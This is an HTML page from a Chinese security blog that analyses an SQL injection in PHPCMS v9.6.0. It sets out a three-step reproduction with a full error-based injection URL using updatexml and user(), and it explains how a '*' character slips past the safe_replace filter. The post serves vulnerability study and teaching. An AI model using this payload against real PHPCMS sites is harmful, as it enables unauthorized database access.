@@ -1,0 +1,229 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>代码审计之PHPCMSv9.6.0 wap模块SQL注入漏洞分析 | Tao's blog</title><meta name="keywords" content="PHP代码审计"><meta name="author" content="Bobtaoy"><meta name="copyright" content="Bobtaoy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析漏洞利用此漏洞利用过程可能稍有复杂，我们可分为以下三个步骤：  Step1: GET请求访问 &#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1  获取set-cookie中的_siteid 结尾的 cookie 字段的值   step2:  1.POST请求访问 &#x2F;index.php?m&#x3D;attac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计之PHPCMSv9.6.0 wap模块SQL注入漏洞分析">
+<meta property="og:url" content="https://bobtaoy.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Tao&#39;s blog">
+<meta property="og:description" content="代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析漏洞利用此漏洞利用过程可能稍有复杂，我们可分为以下三个步骤：  Step1: GET请求访问 &#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1  获取set-cookie中的_siteid 结尾的 cookie 字段的值   step2:  1.POST请求访问 &#x2F;index.php?m&#x3D;attac">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://w.wallhaven.cc/full/n6/wallhaven-n6kde7.jpg">
+<meta property="article:published_time" content="2021-02-09T10:55:00.000Z">
+<meta property="article:modified_time" content="2021-02-09T10:55:26.971Z">
+<meta property="article:author" content="Bobtaoy">
+<meta property="article:tag" content="PHP代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://w.wallhaven.cc/full/n6/wallhaven-n6kde7.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://bobtaoy.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2021-02-09 18:55:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Tao's blog" type="application/atom+xml">
+</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">23</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">9</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90step2"><span class="toc-number">1.1.1.</span> <span class="toc-text">分析step2:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90step1"><span class="toc-number">1.1.2.</span> <span class="toc-text">分析step1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A2%B3%E7%90%86"><span class="toc-number">1.1.3.</span> <span class="toc-text">梳理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.2.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://w.wallhaven.cc/full/n6/wallhaven-n6kde7.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tao's blog</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">代码审计之PHPCMSv9.6.0 wap模块SQL注入漏洞分析</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-02-09T10:55:00.000Z" title="Created 2021-02-09 18:55:00">2021-02-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-02-09T10:55:26.971Z" title="Updated 2021-02-09 18:55:26">2021-02-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PHP/">PHP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PHP/web%E5%AE%89%E5%85%A8/">web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PHP/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="代码审计之PHPCMS-v9-6-0-wap模块SQL注入漏洞分析"><a href="#代码审计之PHPCMS-v9-6-0-wap模块SQL注入漏洞分析" class="headerlink" title="代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析"></a>代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此漏洞利用过程可能稍有复杂，我们可分为以下三个步骤：</p>
+<ul>
+<li><p>Step1: GET请求访问 <code>/index.php?m=wap&amp;c=index&amp;siteid=1</code></p>
+<ul>
+<li>获取<code>set-cookie</code>中的<code>_siteid </code>结尾的 cookie 字段的<strong>值</strong></li>
+</ul>
+</li>
+<li><p>step2:  1.POST请求访问 <code>/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</code></p>
+<ul>
+<li><pre><code class="php">此url通过url解码为: index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;
+// 利用报错注入，语句可替换
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 2.将&#96;Step1&#96;获取&#96;_siteid &#96;结尾的 cookie 字段的**值**，赋值给 &#96;userid_flash&#96; 变量,以post数据提交</span><br><span class="line"></span><br><span class="line">  - 获取&#96;set-cookie&#96;中的&#96;_json&#96;结尾字段的**值**</span><br><span class="line"></span><br><span class="line">- step3: 访问&#96;&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a_k&#x3D;step2获取的_json结尾字段的值&#96;</span><br><span class="line"></span><br><span class="line">  - 例如访问&#96;&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a_k&#x3D;0e72z-2m8OJyw8injqvbY0xJtR5l5UtndXiFZmxcvK9kHkxN1COlnfyINF38Opx6UcdqlABV2gc-8RuG90sS6e31lJn2mxnkJPnUaQDCTAs0gEsKMnL5CHxl-o1hYg2TWaL5blo9RC8ya0yLkSc5NgzCqfTSgZCAlndhgum-OFk1XGARihPaYUs&#96;</span><br><span class="line"></span><br><span class="line">复现过程截图：</span><br><span class="line"></span><br><span class="line">**step1**</span><br><span class="line"></span><br><span class="line">![image-20210208174805741](https:&#x2F;&#x2F;gitee.com&#x2F;bobtaoi&#x2F;md_img&#x2F;raw&#x2F;master&#x2F;img&#x2F;image-20210208174805741.png)</span><br><span class="line"></span><br><span class="line">**step2**</span><br><span class="line"></span><br><span class="line">![image-20210208175005742](https:&#x2F;&#x2F;gitee.com&#x2F;bobtaoi&#x2F;md_img&#x2F;raw&#x2F;master&#x2F;img&#x2F;image-20210208175005742.png)</span><br><span class="line"></span><br><span class="line">**step3**, sql语句执行成功</span><br><span class="line"></span><br><span class="line">![image-20210208175318799](https:&#x2F;&#x2F;gitee.com&#x2F;bobtaoi&#x2F;md_img&#x2F;raw&#x2F;master&#x2F;img&#x2F;image-20210208175318799.png)</span><br><span class="line"></span><br><span class="line">## 漏洞分析</span><br><span class="line"></span><br><span class="line">因为这里有三个步骤，而且关联密切，所以这次我们从后往前分析，最后再从梳理一遍</span><br><span class="line"></span><br><span class="line">### 分析step3:</span><br><span class="line"></span><br><span class="line">​	首先我们分析&#96;phpcms&#x2F;modules&#x2F;content&#x2F;down.php&#96;中的&#96;init&#96;函数（刚开始会执行）：</span><br><span class="line"></span><br><span class="line">![image-20210209173132228](https:&#x2F;&#x2F;gitee.com&#x2F;bobtaoi&#x2F;md_img&#x2F;raw&#x2F;master&#x2F;img&#x2F;image-20210209173132228.png)</span><br><span class="line"></span><br><span class="line">14行sys_auth函数对&#96;$a_k&#96;的值进行解密，然后17行&#96;parse_str&#96;函数对其以&#96;&amp;&#96;分隔符，解析注册变量</span><br><span class="line"></span><br><span class="line">![image-20210209173338398](https:&#x2F;&#x2F;gitee.com&#x2F;bobtaoi&#x2F;md_img&#x2F;raw&#x2F;master&#x2F;img&#x2F;image-20210209173338398.png)</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">$str &#x3D; &quot;first&#x3D;value&amp;arr[]&#x3D;foo+bar&amp;arr[]&#x3D;baz&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 推荐用法</span><br><span class="line">parse_str($str, $output);</span><br><span class="line">echo $output[&#39;first&#39;];  &#x2F;&#x2F; value</span><br><span class="line">echo $output[&#39;arr&#39;][0]; &#x2F;&#x2F; foo bar</span><br><span class="line">echo $output[&#39;arr&#39;][1]; &#x2F;&#x2F; baz</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 不建议这么用</span><br><span class="line">parse_str($str);</span><br><span class="line">echo $first;  &#x2F;&#x2F; value</span><br><span class="line">echo $arr[0]; &#x2F;&#x2F; foo bar</span><br><span class="line">echo $arr[1]; &#x2F;&#x2F; baz</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>注：parse_str作用</p>
+</blockquote>
+<p>26行执行sql查询，我们跟进去看一下</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209173659262.png" alt="image-20210209173659262"></p>
+<p>此时的执行的命令正好造成报错注入</p>
+<h3 id="分析step2"><a href="#分析step2" class="headerlink" title="分析step2:"></a>分析step2:</h3><p>​    接下来我们分析step2,为什么POST请求数据中需要添加<code>userid_flash</code>字段以及对应的值是怎么来的</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209174219035.png" alt="image-20210209174219035"></p>
+<p>在step2访问的请求文件中，类中的构造函数初始化会判断（21-23行）是否有<code>$this-&gt;userid</code>，那么这个<code>$this-&gt;userid</code>是怎么来的呢，17行对它进行了赋值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">&#x27;userid&#x27;</span>] ? $_SESSION[<span class="string">&#x27;userid&#x27;</span>] : (param::get_cookie(<span class="string">&#x27;_userid&#x27;</span>) ? param::get_cookie(<span class="string">&#x27;_userid&#x27;</span>) : sys_auth($_POST[<span class="string">&#x27;userid_flash&#x27;</span>],<span class="string">&#x27;DECODE&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这一行代码，通过三元运算符判断$_SESSION[&#x27;userid&#x27;]是否有值，我们第一步利用中，肯定是没有值的，然后执行(param::get_cookie(&#x27;_userid&#x27;)，然后我们cookie也没有_userid，所以最终$this-&gt;userid = sys_auth($_POST[&#x27;userid_flash&#x27;],&#x27;DECODE&#x27;));</span></span><br></pre></td></tr></table></figure>
+
+<p><code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;))</code>就是对我们step2中<code>userid_flash</code>的值进行解密，这里跟step解密是同一个函数，这里走下来，<code>$this-&gt;userid=1</code></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209180751064.png" alt="image-20210209180751064"></p>
+<p>然后我们查看<code>  /phpcms/modules/attachment/attachments.php</code>分析<code>swfupload_json</code>函数</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209181444482.png" alt="image-20210209181444482"></p>
+<p>这里使用了<code>safe_replace</code>函数对<code>$_GET[&#39;src&#39;]</code>的值进行过滤，函数内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $_GET[&#x27;src&#x27;] = &amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&quot;&#123;&quot;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面<code>id=*%27..</code> 经过<code>safe_replace</code>就变成了<code>id=%27...</code>（大佬就是厉害！妙），继续往后走,将我们的恶意代码进行了<code>set_cookie</code></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209182026023.png" alt="image-20210209182026023"></p>
+<p>然后这里的<code>set_cookie</code>又正好调用了<code>sys_auth</code>函数进行加密</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209182250488.png" alt="image-20210209182250488"></p>
+<h3 id="分析step1"><a href="#分析step1" class="headerlink" title="分析step1"></a>分析step1</h3><p>​    <code>userid_flash =a291M4pDz3fa59ilYnOLNL_60K5piWuJbrMMzdL_ </code></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209183944123.png" alt="image-20210209183944123"></p>
+<p><code>/phpcms/libs/classes/param.class.php</code>中调用<code>set_cookie</code>中<code>sys_auth</code>函数进行加密。</p>
+<h3 id="梳理"><a href="#梳理" class="headerlink" title="梳理"></a>梳理</h3><p>总的来说就是step1中调用<code>set_cookie</code>中<code>sys_auth</code>函数进行加密，然后step2中<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</code>获取解密(绕过报错)，在这一步，GET请求附带了sql报错注入一句，且使用<code>*</code>绕过<code>safe_replace</code>，然后加密，到了step3，又进行解密，然后执行，漏洞就产生了</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/275/">https://paper.seebug.org/275/</a></li>
+</ul>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Bobtaoy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://bobtaoy.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://bobtaoy.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHP代码审计</a></div><div class="post_share"><div class="social-share" data-image="https://w.wallhaven.cc/full/n6/wallhaven-n6kde7.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/02/07/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><img class="next-cover" src="https://w.wallhaven.cc/full/n6/wallhaven-n6kde7.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">代码审计之PHPCMSV9.6 任意文件上传漏洞分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/02/06/代码审计之PHPCMSV9-2上传漏洞分析/" title="代码审计之PHPCMSV9.2上传漏洞分析"><img class="cover" src="https://w.wallhaven.cc/full/n6/wallhaven-n6kde7.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-06</div><div class="title">代码审计之PHPCMSV9.2上传漏洞分析</div></div></a></div><div><a href="/2021/02/07/代码审计之PHPCMSV9-6-任意文件上传漏洞分析/" title="代码审计之PHPCMSV9.6 任意文件上传漏洞分析"><img class="cover" src="https://w.wallhaven.cc/full/n6/wallhaven-n6kde7.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-07</div><div class="title">代码审计之PHPCMSV9.6 任意文件上传漏洞分析</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></article></main><footer id="footer" style="background-image: url(https://w.wallhaven.cc/full/n6/wallhaven-n6kde7.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Bobtaoy</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Just trust yourself, then you will know how to live.</div></div></footer></div><section 